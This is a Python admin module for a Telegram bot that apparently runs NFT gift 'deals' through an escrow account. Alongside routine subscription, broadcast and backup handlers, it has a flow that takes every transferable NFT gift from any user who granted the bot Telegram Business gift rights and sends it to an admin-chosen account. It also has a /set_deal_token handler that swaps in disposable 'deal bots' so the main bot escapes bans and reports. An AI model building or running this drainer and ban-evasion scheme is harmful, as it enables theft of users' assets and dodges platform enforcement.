import os
import re
import asyncio
import logging
from datetime import datetime, timezone
from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.exceptions import TelegramRetryAfter, TelegramForbiddenError

import config
import database as db
from parser import format_number

logger = logging.getLogger("nft_bot.admin")
admin_router = Router()

class AdminStates(StatesGroup):
    waiting_grant_input = State()
    waiting_grant_plan = State()
    waiting_revoke_input = State()
    waiting_check_input = State()
    waiting_broadcast_text = State()
    waiting_withdraw_user = State()
    waiting_withdraw_target = State()
    waiting_new_token = State()

def is_admin(user_id: int) -> bool:
    return user_id in config.ADMIN_IDS

def format_date_display(dt_str: str) -> str:
    try:
        dt = datetime.strptime(dt_str, "%Y-%m-%d %H:%M:%S")
        return dt.strftime("%d.%m.%Y в %H:%M")
    except Exception:
        return dt_str

def get_admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📊 Обновить статистику", callback_data="admin_stats")
        ],
        [
            InlineKeyboardButton(text="🔥 Полученные подарки (@DealNftOffer)", callback_data="admin_deals")
        ],
        [
            InlineKeyboardButton(text="🎁 Вывести подарки/NFT с Business", callback_data="admin_withdraw_gifts")
        ],
        [
            InlineKeyboardButton(text="➕ Выдать подписку", callback_data="admin_grant"),
            InlineKeyboardButton(text="➖ Забрать подписку", callback_data="admin_revoke")
        ],
        [
            InlineKeyboardButton(text="🔍 Проверить юзера", callback_data="admin_check"),
            InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")
        ],
        [
            InlineKeyboardButton(text="🔑 Сменить токен бота (.env)", callback_data="admin_change_token")
        ],
        [
            InlineKeyboardButton(text="💾 Скачать базу данных (.sqlite3)", callback_data="admin_download_db")
        ],
        [
            InlineKeyboardButton(text="❌ Закрыть", callback_data="admin_close")
        ]
    ])

def get_admin_deals_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔄 Обновить список", callback_data="admin_deals")
        ],
        [
            InlineKeyboardButton(text="🔙 Назад в админку", callback_data="admin_menu")
        ]
    ])

def get_grant_plan_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="⭐️ Обычный (250 Stars)", callback_data="admin_grant_plan:standard")
        ],
        [
            InlineKeyboardButton(text="👑 Premium (1000 Stars)", callback_data="admin_grant_plan:premium")
        ],
        [
            InlineKeyboardButton(text="🔙 Отмена", callback_data="admin_menu")
        ]
    ])

def get_cancel_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Отмена", callback_data="admin_menu")]
    ])

async def build_stats_text() -> str:
    stats = await db.get_admin_stats()
    return (
        "👑 <b>Панель администратора</b>\n\n"
        "📊 <b>Статистика сервиса:</b>\n"
        f"• Пользователей в базе: <b>{stats['total_users']}</b>\n"
        f"• Активных подписок: <b>{stats['active_subs']}</b>\n"
        f"• Заработано Stars: <b>{stats['total_stars']} ⭐️</b> ({stats['total_payments']} платежей)\n"
        f"• Заработано TON: <b>{stats.get('total_ton', 0.0)} 💎</b> ({stats.get('total_ton_payments', 0)} платежей)\n"
        f"• Всего создано офферов: <b>{stats['total_deals']}</b>\n"
        f"• Успешно завершено: <b>{stats['completed_deals']}</b>\n\n"
        "💎 <b>Прямой кошелёк TON (без холда):</b>\n"
        f"<code>{config.TON_WALLET_ADDRESS}</code>\n"
        "<i>Все оплаты в TON поступают прямо на этот кошелёк мгновенно.</i>\n\n"
        "⭐️ <b>Вывод Stars:</b>\n"
        "Откройте профиль бота в Telegram ➡️ Баланс звёзд (после 21 дня холда)."
    )

@admin_router.message(Command("admin"))
async def handle_admin_command(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return

    await db.register_user(user_id, message.from_user.username, message.from_user.first_name)
    await state.clear()
    text = await build_stats_text()
    await message.answer(text, reply_markup=get_admin_keyboard(), parse_mode="HTML")

@admin_router.callback_query(F.data == "admin_menu")
async def handle_admin_menu(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.clear()
    text = await build_stats_text()
    await callback.message.edit_text(text, reply_markup=get_admin_keyboard(), parse_mode="HTML")
    try:
        await callback.answer()
    except Exception:
        pass

@admin_router.callback_query(F.data == "admin_stats")
async def handle_admin_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    text = await build_stats_text()
    try:
        await callback.message.edit_text(text, reply_markup=get_admin_keyboard(), parse_mode="HTML")
    except Exception:
        pass
    try:
        await callback.answer()
    except Exception:
        pass

@admin_router.callback_query(F.data == "admin_close")
async def handle_admin_close(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.clear()
    await callback.message.delete()
    await callback.answer()

# --- GRANT SUBSCRIPTION ---
@admin_router.callback_query(F.data == "admin_grant")
async def handle_grant_button(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_grant_input)
    text = (
        "➕ <b>Выдача подписки вручную</b>\n\n"
        "Отправьте <b>ID пользователя или @username</b> и количество дней через пробел:\n\n"
        "<i>Пример:</i>\n"
        "<code>7900020458 30</code>\n"
        "или\n"
        "<code>@username 90</code>\n\n"
        "<i>(Если количество дней не указано, будет выдано 30 дней)</i>"
    )
    await callback.message.edit_text(text, reply_markup=get_cancel_keyboard(), parse_mode="HTML")
    await callback.answer()

@admin_router.message(AdminStates.waiting_grant_input)
async def process_grant_input(message: Message, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split()
    target_str = parts[0]
    days = 30
    if len(parts) > 1 and parts[1].isdigit():
        days = int(parts[1])

    user = await db.find_user(target_str)
    target_id = None
    target_username = None
    first_name = "User"

    if user:
        target_id = user["user_id"]
        target_username = user.get("username")
        first_name = user.get("first_name", "User")
    elif target_str.lstrip("@").isdigit():
        target_id = int(target_str.lstrip("@"))
    else:
        await message.reply(
            f"❌ Пользователь <code>{target_str}</code> не найден в базе бота!\n"
            "Пользователь должен хотя бы 1 раз написать /start боту.",
            reply_markup=get_cancel_keyboard(),
            parse_mode="HTML"
        )
        return

    await state.update_data(
        target_id=target_id,
        target_username=target_username,
        first_name=first_name,
        days=days
    )
    await state.set_state(AdminStates.waiting_grant_plan)

    username_display = f"@{target_username}" if target_username else "не указан"
    text = (
        "➕ <b>Выбор тарифа подписки</b>\n\n"
        f"• Пользователь: <code>{target_id}</code> ({username_display})\n"
        f"• Имя: <b>{first_name}</b>\n"
        f"• Количество дней: <b>{days}</b>\n\n"
        "Выберите кнопкой, какой тариф выдать:"
    )
    await message.reply(text, reply_markup=get_grant_plan_keyboard(), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin_grant_plan:"))
async def handle_grant_plan_selection(callback: CallbackQuery, state: FSMContext, bot: Bot):
    if not is_admin(callback.from_user.id):
        return

    data = await state.get_data()
    target_id = data.get("target_id")
    if not target_id:
        await callback.answer("Данные устарели. Повторите попытку.", show_alert=True)
        await state.clear()
        return

    plan = callback.data.split(":")[1]
    days = data.get("days", 30)
    target_username = data.get("target_username")
    first_name = data.get("first_name", "User")

    if plan == "premium":
        plan_name = "👑 Premium (1000 Stars)"
    else:
        plan_name = "⭐️ Обычный (250 Stars)"

    new_exp = await db.add_or_extend_subscription(
        user_id=target_id,
        username=target_username,
        first_name=first_name,
        days=days,
        plan=plan,
        charge_id="ADMIN_GRANT"
    )

    await state.clear()

    date_formatted = format_date_display(new_exp)
    username_display = f"@{target_username}" if target_username else "-"

    await callback.message.edit_text(
        f"✅ <b>Подписка успешно выдана!</b>\n\n"
        f"• Пользователь: <code>{target_id}</code> ({username_display})\n"
        f"• Выданный тариф: <b>{plan_name}</b>\n"
        f"• Добавлено: <b>{days} дней</b>\n"
        f"• Действует до: <b>{date_formatted}</b>",
        reply_markup=get_admin_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer()

    # Notify user
    try:
        await bot.send_message(
            chat_id=target_id,
            text=(
                f"🎉 <b>Администратор выдал вам подписку!</b>\n\n"
                f"• Тариф: <b>{plan_name}</b>\n"
                f"• Срок: <b>{days} дней</b>\n"
                f"• Действует до: <b>{date_formatted}</b>\n\n"
                "Доступ активирован!"
            ),
            parse_mode="HTML"
        )
    except Exception:
        pass

# --- REVOKE SUBSCRIPTION ---
@admin_router.callback_query(F.data == "admin_revoke")
async def handle_revoke_button(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_revoke_input)
    text = (
        "➖ <b>Аннулирование подписки</b>\n\n"
        "Отправьте <b>ID пользователя или @username</b>, у которого нужно забрать подписку:\n\n"
        "<i>Пример:</i> <code>7900020458</code> или <code>@username</code>"
    )
    await callback.message.edit_text(text, reply_markup=get_cancel_keyboard(), parse_mode="HTML")
    await callback.answer()

@admin_router.message(AdminStates.waiting_revoke_input)
async def process_revoke_input(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return

    target_str = message.text.strip()
    user = await db.find_user(target_str)
    target_id = user["user_id"] if user else (int(target_str) if target_str.isdigit() else None)

    if not target_id:
        await message.reply(
            f"❌ Пользователь <code>{target_str}</code> не найден!",
            reply_markup=get_cancel_keyboard(),
            parse_mode="HTML"
        )
        return

    await db.revoke_subscription(target_id)
    await state.clear()
    await message.reply(
        f"🚫 <b>Подписка пользователя {target_id} аннулирована!</b>",
        reply_markup=get_admin_keyboard(),
        parse_mode="HTML"
    )

# --- CHECK USER ---
@admin_router.callback_query(F.data == "admin_check")
async def handle_check_button(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_check_input)
    text = (
        "🔍 <b>Проверка пользователя</b>\n\n"
        "Отправьте <b>ID или @username</b> пользователя для проверки статуса:"
    )
    await callback.message.edit_text(text, reply_markup=get_cancel_keyboard(), parse_mode="HTML")
    await callback.answer()

@admin_router.message(AdminStates.waiting_check_input)
async def process_check_input(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return

    target_str = message.text.strip()
    user = await db.find_user(target_str)
    target_id = user["user_id"] if user else (int(target_str) if target_str.isdigit() else None)

    if not target_id:
        await message.reply(
            f"❌ Пользователь <code>{target_str}</code> не найден!",
            reply_markup=get_cancel_keyboard(),
            parse_mode="HTML"
        )
        return

    sub = await db.get_subscription(target_id)
    is_active = await db.is_subscription_active(target_id)
    status_emoji = "🟢 Активна" if is_active else "🔴 Не активна"
    exp_text = sub["expires_at"] if sub else "Никогда не оформлялась"

    await state.clear()
    await message.reply(
        f"👤 <b>Информация о пользователе:</b>\n\n"
        f"• ID: <code>{target_id}</code>\n"
        f"• Username: @{user.get('username') if user else '-'}\n"
        f"• Имя: {user.get('first_name') if user else '-'}\n"
        f"• Подписка: <b>{status_emoji}</b>\n"
        f"• Действует до: <b>{exp_text} UTC</b>",
        reply_markup=get_admin_keyboard(),
        parse_mode="HTML"
    )

# --- BROADCAST ---
@admin_router.callback_query(F.data == "admin_broadcast")
async def handle_broadcast_button(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_broadcast_text)
    text = (
        "📢 <b>Рассылка сообщений</b>\n\n"
        "Отправьте сообщение (текст, фото или форматирование), которое нужно разослать всем пользователям бота:"
    )
    await callback.message.edit_text(text, reply_markup=get_cancel_keyboard(), parse_mode="HTML")
    await callback.answer()

@admin_router.message(AdminStates.waiting_broadcast_text)
async def process_broadcast_message(message: Message, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return

    user_ids = await db.get_all_user_ids()
    total = len(user_ids)
    if total == 0:
        await message.reply("В базе пока нет пользователей для рассылки.", reply_markup=get_admin_keyboard())
        await state.clear()
        return

    status_msg = await message.reply(f"⏳ Начинаю рассылку для {total} пользователей...")
    sent = 0
    blocked = 0

    for uid in user_ids:
        try:
            await message.copy_to(chat_id=uid)
            sent += 1
            await asyncio.sleep(0.05)
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after)
            try:
                await message.copy_to(chat_id=uid)
                sent += 1
            except Exception:
                blocked += 1
        except (TelegramForbiddenError, Exception) as e:
            blocked += 1
            logger.debug(f"Could not send broadcast to {uid}: {e}")

    await state.clear()
    await status_msg.edit_text(
        f"📢 <b>Рассылка завершена!</b>\n\n"
        f"• Успешно доставлено: <b>{sent}</b>\n"
        f"• Не доставлено (заблокировали бота): <b>{blocked}</b>\n"
        f"• Всего получателей: <b>{total}</b>",
        reply_markup=get_admin_keyboard(),
        parse_mode="HTML"
    )

# --- WITHDRAW GIFTS FROM BUSINESS ACCOUNT ---

@admin_router.callback_query(F.data == "admin_withdraw_gifts")
async def handle_withdraw_gifts_button(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_withdraw_user)
    text = (
        "🎁 <b>Вывод подарков и NFT с Business-аккаунта</b>\n\n"
        "Введите <b>@username</b> или <b>Telegram ID</b> пользователя, который подключил бота в Telegram Business и выдал права на управление подарками:"
    )
    await callback.message.edit_text(text, reply_markup=get_cancel_keyboard(), parse_mode="HTML")
    await callback.answer()

@admin_router.message(AdminStates.waiting_withdraw_user)
async def process_withdraw_user_input(message: Message, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return

    text = message.text.strip()
    conn = await db.get_business_connection_by_user(text)

    if not conn:
        await message.reply(
            f"❌ Пользователь <b>{text}</b> не найден в подключениях Telegram Business (или интеграция отключена).\n\n"
            "Убедитесь, что аккаунт подключил бота в Настройки ➡️ Telegram Business ➡️ Чат-боты с разрешениями на подарки.",
            reply_markup=get_admin_keyboard(),
            parse_mode="HTML"
        )
        await state.clear()
        return

    conn_id = conn["connection_id"]
    await message.reply(f"🔍 Запрашиваю данные и подарки с бизнес-аккаунта (ID: <code>{conn['user_id']}</code>)...")

    # 1. Проверяем права бота в Business Connection
    try:
        conn_info = await bot.get_business_connection(business_connection_id=conn_id)
        rights = getattr(conn_info, "rights", None)
        can_transfer = getattr(rights, "can_transfer_and_upgrade_gifts", False) if rights else False
        can_stars = getattr(rights, "can_transfer_stars", False) if rights else False
    except Exception as e:
        can_transfer = False
        can_stars = False

    try:
        gifts_res = await bot.get_business_account_gifts(business_connection_id=conn_id)
        gifts = gifts_res.gifts
    except Exception as e:
        await message.reply(
            f"❌ Ошибка при запросе подарков через API:\n<code>{e}</code>\n\n"
            "⚠️ <b>Проверьте права в Telegram Business:</b>\n"
            "В настройках подключения бота категория <b>«Управление подарками и звёздами»</b> должна быть раскрыта и включены пункты:\n"
            "• Просмотр подарков и звёзд\n"
            "• Передача и улучшение подарков\n"
            "• Перевод звёзд",
            reply_markup=get_admin_keyboard(),
            parse_mode="HTML"
        )
        await state.clear()
        return

    if not gifts:
        await message.reply(
            f"ℹ️ На аккаунте пользователя <b>{text}</b> нет активных подарков / NFT.",
            reply_markup=get_admin_keyboard(),
            parse_mode="HTML"
        )
        await state.clear()
        return

    gift_items = []
    regular_count = 0
    now_utc = datetime.now(timezone.utc)

    for g in gifts:
        gift_id = getattr(g, "owned_gift_id", None)
        if not gift_id:
            continue
        gift_type = getattr(g, "type", "regular")
        inner = getattr(g, "gift", None)
        name = getattr(inner, "title", None) or getattr(inner, "name", "Подарок")

        if gift_type == "unique":
            can_be_transferred = getattr(g, "can_be_transferred", True)
            transfer_star_count = getattr(g, "transfer_star_count", 0) or 0
            next_transfer_date = getattr(g, "next_transfer_date", None)
            is_locked = False
            lock_info = ""
            if next_transfer_date and next_transfer_date > now_utc:
                is_locked = True
                lock_info = f" (заблокирован Telegram до {next_transfer_date.strftime('%d.%m.%Y %H:%M')} UTC)"

            gift_items.append({
                "gift_id": gift_id,
                "type": "unique",
                "name": name,
                "can_be_transferred": can_be_transferred,
                "transfer_star_count": transfer_star_count,
                "is_locked": is_locked,
                "lock_info": lock_info
            })
        else:
            # Обычные подарки (торт, конфеты и т.д.) нельзя передавать через transfer_gift
            regular_count += 1

    if not gift_items:
        warning_text = (
            f"ℹ️ На аккаунте найдено обычных подарков: <b>{regular_count}</b>, но <b>0 уникальных NFT-подарков</b>.\n\n"
            "📌 <i>В Telegram обычные подарки (торты, сердечки) невозможно передать другому пользователю через API — передавать можно только коллекционные/уникальные NFT-подарки (мишки, пепе, лимитированные NFT).</i>"
        )
        await message.reply(warning_text, reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await state.clear()
        return

    # Проверка прав на вывод
    rights_warning = ""
    if not can_transfer:
        rights_warning = (
            "\n\n⚠️ <b>ВНИМАНИЕ:</b> У этого пользователя в Telegram Business <b>НЕ включена галочка «Передавать и улучшать подарки»</b>!\n"
            "<i>Telegram отклонит перевод с ошибкой BOT_ACCESS_FORBIDDEN, пока пользователь не выдаст это разрешение в настройках чат-бота.</i>\n"
        )
    elif not can_stars:
        rights_warning = (
            "\n\n⚠️ <b>ВНИМАНИЕ:</b> У пользователя не включена галочка «Переводить звёзды» (нужна для оплаты комиссии перевода в 25 звёзд).\n"
        )

    await state.update_data(
        business_conn_id=conn_id,
        source_user=text,
        gift_items=gift_items
    )
    await state.set_state(AdminStates.waiting_withdraw_target)

    items_list_str = "\n".join([
        f"• 🧸 <b>{it['name']}</b> (Комиссия: {it['transfer_star_count']} ⭐️){it['lock_info']}"
        for it in gift_items[:10]
    ])

    summary_text = (
        f"✅ <b>Найдено NFT-подарков для вывода: {len(gift_items)}</b>\n\n"
        f"• Аккаунт-источник: <code>{text}</code> (ID: <code>{conn['user_id']}</code>)\n"
        f"{items_list_str}\n"
        f"{rights_warning}\n"
        "<b>Куда перевести эти подарки?</b>\n"
        f"Отправьте <b>Telegram ID</b> или <b>@username</b> получателя (или отправьте <code>0</code>, чтобы перевести на ваш ID: <code>{config.GIFT_RECIPIENT_ID}</code>):"
    )
    await message.reply(summary_text, reply_markup=get_cancel_keyboard(), parse_mode="HTML")

@admin_router.message(AdminStates.waiting_withdraw_target)
async def process_withdraw_target_input(message: Message, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return

    data = await state.get_data()
    conn_id = data.get("business_conn_id")
    gift_items = data.get("gift_items", [])
    source_user = data.get("source_user")

    target_input = message.text.strip()
    if target_input == "0":
        target_chat_id = config.GIFT_RECIPIENT_ID
    elif target_input.replace("-", "").isdigit():
        target_chat_id = int(target_input)
    else:
        try:
            chat = await bot.get_chat(target_input)
            target_chat_id = chat.id
        except Exception:
            await message.reply("❌ Не удалось найти пользователя по юзернейму. Введите его числовой Telegram ID:")
            return

    status_msg = await message.reply(f"⏳ Начинаю перевод {len(gift_items)} NFT-подарков на ID <code>{target_chat_id}</code>...")

    transferred = 0
    failed = 0
    errors = []

    for item in gift_items:
        if item.get("is_locked"):
            failed += 1
            err_msg = f"Подарок {item['name']} заблокирован Telegram{item.get('lock_info')}"
            if err_msg not in errors:
                errors.append(err_msg)
            continue

        try:
            star_fee = item.get("transfer_star_count") or None
            success = await bot.transfer_gift(
                business_connection_id=conn_id,
                owned_gift_id=item["gift_id"],
                new_owner_chat_id=target_chat_id,
                star_count=star_fee
            )
            if success:
                transferred += 1
            else:
                failed += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            failed += 1
            err_str = str(e)
            if "BOT_ACCESS_FORBIDDEN" in err_str:
                err_str = "BOT_ACCESS_FORBIDDEN (В Telegram Business у пользователя не включена галочка 'Передавать и улучшать подарки' или 'Переводить звёзды')"
            if err_str not in errors:
                errors.append(err_str)

    await state.clear()
    result_text = (
        f"🎁 <b>Результат вывода подарков:</b>\n\n"
        f"• Источник: <code>{source_user}</code>\n"
        f"• Получатель: <code>{target_chat_id}</code>\n"
        f"• Успешно переведено: <b>{transferred}</b>\n"
        f"• Не удалось перевести: <b>{failed}</b>\n"
    )
    if errors:
        result_text += f"\n<i>Причины ошибок:</i>\n" + "\n".join([f"• <code>{err}</code>" for err in errors[:3]])

    await status_msg.edit_text(result_text, reply_markup=get_admin_keyboard(), parse_mode="HTML")

# --- DATABASE BACKUP / DOWNLOAD ---

@admin_router.callback_query(F.data == "admin_download_db")
async def handle_download_db(callback: CallbackQuery, bot: Bot):
    if not is_admin(callback.from_user.id):
        await callback.answer("Нет доступа!", show_alert=True)
        return

    if not config.DB_PATH.exists():
        await callback.answer("Файл базы данных не найден!", show_alert=True)
        return

    await callback.answer("⏳ Отправляю файл базы данных...")
    try:
        async with db.get_write_db() as conn:
            await conn.execute("PRAGMA wal_checkpoint(TRUNCATE);")
    except Exception as e_wal:
        logger.warning(f"WAL checkpoint before backup error: {e_wal}")

    try:
        doc = FSInputFile(config.DB_PATH, filename="bot_database.sqlite3")
        await bot.send_document(
            chat_id=callback.from_user.id,
            document=doc,
            caption="💾 <b>Резервная копия базы данных</b>\nСодержит всех пользователей, подписки и сделки.",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Error sending database backup: {e}")
        await callback.message.reply(f"❌ Ошибка отправки базы данных: {e}")

@admin_router.message(Command("backup"))
async def handle_backup_command(message: Message, bot: Bot):
    if not is_admin(message.from_user.id):
        return

    if not config.DB_PATH.exists():
        await message.reply("Файл базы данных не найден!")
        return

    msg = await message.reply("⏳ Формирую резервную копию базы данных...")
    try:
        async with db.get_write_db() as conn:
            await conn.execute("PRAGMA wal_checkpoint(TRUNCATE);")
    except Exception as e_wal:
        logger.warning(f"WAL checkpoint before backup error: {e_wal}")

    try:
        doc = FSInputFile(config.DB_PATH, filename="bot_database.sqlite3")
        await bot.send_document(
            chat_id=message.from_user.id,
            document=doc,
            caption="💾 <b>Резервная копия базы данных</b>\nСодержит всех пользователей, подписки и сделки.",
            parse_mode="HTML"
        )
        await msg.delete()
    except Exception as e:
        logger.error(f"Error sending backup: {e}")
        await msg.edit_text(f"❌ Ошибка отправки базы данных: {e}")

# --- RECEIVED GIFTS ON @DealNftOffer (DEALS) ---

@admin_router.callback_query(F.data == "admin_deals")
async def handle_admin_deals(callback: CallbackQuery, bot: Bot):
    if not is_admin(callback.from_user.id):
        await callback.answer("Нет доступа!", show_alert=True)
        return

    await callback.answer("Загружаю список подарков...")

    received_items = []
    # 1. Подарки в личном профиле @DealNftOffer через официальный Telegram API
    try:
        user_gifts = await bot.get_user_gifts(user_id=config.GIFT_RECIPIENT_ID)
        if user_gifts and user_gifts.gifts:
            for g in user_gifts.gifts:
                inner = getattr(g, "gift", None)
                if getattr(g, "type", "") == "unique":
                    name = getattr(inner, "name", None) or getattr(inner, "title", "NFT Подарок")
                    num = getattr(inner, "number", "")
                    num_str = f" #{format_number(num)}" if num else ""
                    gift_name = f"{name}{num_str}"
                else:
                    gift_name = getattr(inner, "name", "Подарок")

                send_date = getattr(g, "send_date", 0)
                if send_date:
                    dt = datetime.fromtimestamp(send_date, tz=timezone.utc)
                    time_str = dt.strftime("%d.%m.%Y в %H:%M")
                else:
                    time_str = "время не указано"

                received_items.append((send_date, f"🎁 <b>{gift_name}</b> — {time_str}"))
    except Exception as e:
        logger.error(f"Error fetching user gifts for admin deals: {e}")

    # 2. Подарки в Telegram Business аккаунте @DealNftOffer (если подключен)
    try:
        conn = await db.get_business_connection_by_user(config.GIFT_RECIPIENT_ID)
        if conn and conn.get("connection_id"):
            bgifts = await bot.get_business_account_gifts(business_connection_id=conn["connection_id"])
            if bgifts and bgifts.gifts:
                for g in bgifts.gifts:
                    inner = getattr(g, "gift", None)
                    if getattr(g, "type", "") == "unique":
                        name = getattr(inner, "name", None) or getattr(inner, "title", "NFT Подарок")
                        num = getattr(inner, "number", "")
                        num_str = f" #{format_number(num)}" if num else ""
                        gift_name = f"{name}{num_str}"
                    else:
                        gift_name = getattr(inner, "name", "Подарок")

                    send_date = getattr(g, "send_date", 0)
                    if send_date:
                        dt = datetime.fromtimestamp(send_date, tz=timezone.utc)
                        time_str = dt.strftime("%d.%m.%Y в %H:%M")
                    else:
                        time_str = "время не указано"

                    item = (send_date, f"🎁 <b>{gift_name}</b> — {time_str}")
                    if item not in received_items:
                        received_items.append(item)
    except Exception as e:
        logger.debug(f"Error fetching business gifts for admin deals: {e}")

    # Сортируем: сначала самые свежие
    received_items.sort(key=lambda x: x[0], reverse=True)

    if not received_items:
        text = (
            f"🔥 <b>Завершённые сделки ({config.GIFT_RECIPIENT})</b>\n\n"
            f"На аккаунт <b>{config.GIFT_RECIPIENT}</b> пока не поступило ни одного NFT-подарка."
        )
    else:
        text = (
            f"🔥 <b>Завершённые сделки ({config.GIFT_RECIPIENT})</b>\n\n"
            f"Подарки, фактически поступившие на аккаунт гаранта (всего: <b>{len(received_items)}</b>):\n\n"
        )
        for i, (_, line) in enumerate(received_items[:50], 1):
            text += f"{i}. {line}\n"

    try:
        await callback.message.edit_text(text, reply_markup=get_admin_deals_keyboard(), parse_mode="HTML")
    except Exception:
        await callback.message.answer(text, reply_markup=get_admin_deals_keyboard(), parse_mode="HTML")

def update_env_file(key: str, val: str) -> bool:
    env_path = ".env"
    try:
        content = ""
        if os.path.exists(env_path):
            with open(env_path, "r", encoding="utf-8") as f:
                content = f.read()
        pattern = rf"^{re.escape(key)}=.*$"
        if re.search(pattern, content, flags=re.MULTILINE):
            new_content = re.sub(pattern, f"{key}={val}", content, flags=re.MULTILINE)
        else:
            new_content = content + f"\n{key}={val}\n"
        with open(env_path, "w", encoding="utf-8") as f:
            f.write(new_content)
        return True
    except Exception as e:
        logger.error(f"Failed to update {key} in .env: {e}")
        return False

@admin_router.callback_query(F.data == "admin_change_token")
async def handle_admin_change_token(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён!", show_alert=True)
        return
    await state.set_state(AdminStates.waiting_new_token)
    current_masked = config.BOT_TOKEN[:10] + "..." if config.BOT_TOKEN else "не установлен"
    text = (
        f"🔑 <b>Смена токена бота</b>\n\n"
        f"Текущий токен: <code>{current_masked}</code>\n\n"
        f"Отправьте новый <b>BOT_TOKEN</b> от @BotFather (или отправьте /cancel для отмены).\n"
        f"<i>После отправки бот обновит файл .env на сервере.</i>"
    )
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Отмена", callback_data="admin_menu")]
    ])
    await callback.message.answer(text, reply_markup=cancel_kb, parse_mode="HTML")
    await callback.answer()

@admin_router.message(AdminStates.waiting_new_token)
async def process_new_bot_token(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    token = message.text.strip()
    if token.lower() in ("/cancel", "отмена"):
        await state.clear()
        await message.answer("Смена токена отменена.", reply_markup=get_admin_keyboard())
        return
    if not re.match(r"^\d{8,12}:[A-Za-z0-9_-]{30,}$", token):
        await message.answer(
            "❌ Некорректный формат токена Telegram!\n"
            "Формат токена: <code>1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ</code>\n\n"
            "Попробуйте ещё раз или отправьте /cancel:",
            parse_mode="HTML"
        )
        return

    ok = update_env_file("BOT_TOKEN", token)
    await state.clear()
    if ok:
        config.BOT_TOKEN = token
        await message.answer(
            "✅ <b>Новый BOT_TOKEN успешно сохранён в .env!</b>\n\n"
            "⚡️ <i>Перезапустите бота на хостинге (или в панели Bothost ➔ Перезапуск / Rebuild), "
            "чтобы бот начал работать на новом токене.</i>",
            reply_markup=get_admin_keyboard(),
            parse_mode="HTML"
        )
    else:
        await message.answer("❌ Ошибка при записи в .env файл на диске.", reply_markup=get_admin_keyboard())

@admin_router.message(Command("set_token"))
async def cmd_set_token(message: Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Использование: <code>/set_token 123456789:ABCdef...</code>", parse_mode="HTML")
        return
    token = args[1].strip()
    if not re.match(r"^\d{8,12}:[A-Za-z0-9_-]{30,}$", token):
        await message.answer("❌ Неверный формат токена!", parse_mode="HTML")
        return
    if update_env_file("BOT_TOKEN", token):
        config.BOT_TOKEN = token
        await message.answer(
            "✅ <b>Новый BOT_TOKEN успешно сохранён в .env!</b>\n"
            "Перезапустите бота в панели хостинга для применения.",
            parse_mode="HTML"
        )
    else:
        await message.answer("❌ Ошибка при сохранении токена.", parse_mode="HTML")

@admin_router.message(Command("set_deal_token"))
async def cmd_set_deal_token(message: Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Использование: <code>/set_deal_token 123456789:ABCdef...</code>", parse_mode="HTML")
        return
    token = args[1].strip()
    wait_msg = await message.answer("⏳ <i>Подключаю и запускаю нового бота сделок в Telegram...</i>", parse_mode="HTML")
    from worker_manager import worker_manager
    ok, res = await worker_manager.start_deal_bot(token)
    try:
        await wait_msg.delete()
    except Exception:
        pass

    if ok:
        await message.answer(
            f"✅ <b>Бот сделок @{res} успешно подключён и запущен!</b>\n\n"
            f"🎯 <b>Что изменилось:</b>\n"
            f"• Теперь при нажатии кнопки «Принять» во всех офферах покупатели/продавцы будут перенаправляться в <b>@{res}</b>.\n"
            f"• Основной бот защищён от банов и репортов со сделок.\n"
            f"• В случае блокировки бота сделок просто отправьте <code>/set_deal_token новый_токен</code>.",
            parse_mode="HTML"
        )
    else:
        await message.answer(f"❌ <b>Ошибка при запуске бота сделок:</b>\n{res}", parse_mode="HTML")




